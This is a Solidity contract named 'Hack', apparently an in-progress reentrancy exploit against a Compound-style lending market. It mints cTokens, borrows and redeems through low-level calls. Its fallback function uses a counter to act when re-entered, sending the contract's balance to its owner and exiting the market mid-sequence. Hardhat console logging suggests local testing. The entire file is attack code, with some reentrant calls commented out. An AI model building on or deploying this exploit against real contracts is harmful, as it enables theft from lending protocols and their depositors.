//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.16;

import './CEther.sol';
import './Comptroller.sol';
import 'hardhat/console.sol';

contract Hack {
    address payable owner;
    address comptroller;
    address cether;
    address payable _cether;
    uint i;
    constructor(address _comptroller, address __cether) public {
        comptroller = _comptroller;
        cether = __cether;
        _cether = address(uint160(cether));
        owner = msg.sender;
    }
    function enterMarket() public {
        address[] memory markets = new address[](1);
        markets[0] = cether;

        Comptroller(comptroller).enterMarkets(markets);
    }

    function callMint() public {
        //CEther(_cether).mint.value(10 ether);
        (bool success, )= _cether.call.value(10 ether)(abi.encodeWithSignature('mint()'));
        require(success, 'mint failed');
    }

    function getCEthBalance() public view returns(uint256){
        return CEther(_cether).balanceOf(address(this));
    }

    function callBorrow() public returns(bool){
        //CEther(_cether).borrow(1);
        (bool success, ) = _cether.call.gas(500000000000)(abi.encodeWithSignature('borrow(uint256)', 10));
        require(success, 'borrow failed');
        return success;
    }

    function checkAllMarkets() public returns(address){

    } 

    function callrepayBorrow() public {
        (bool success, ) = _cether.call.value(10)(abi.encodeWithSignature('repayBorrow()'));
        require(success, 'asshole');
    }

    function callExitMarket() public {
        Comptroller(comptroller).exitMarket(cether);
    }

    function callRedeemUnderlying() public {
        (bool success, ) = _cether.call(abi.encodeWithSignature('redeemUnderlying(uint256)', 11 ether));
        require(success, 'redemption failed');
    }
    
    function callApprove() public {
        CEther(_cether).approve(_cether, uint(-1));
    }

    function() external payable{
        if(i == 0){
            console.log('i value in if %s:', i);      
        }

        if(i == 2){
            while(i != 3) {
                //callrepayBorrow();
                //callBorrow();
                console.log('hack balance each loop', address(this).balance);
                owner.transfer(address(this).balance);
                
                console.log('i value %s:', i);
                i++;    
            }                
        }

        if(i == 4) {
            callExitMarket();
        }

        i++;
        console.log('I VALOZZ %s', i);
    }
}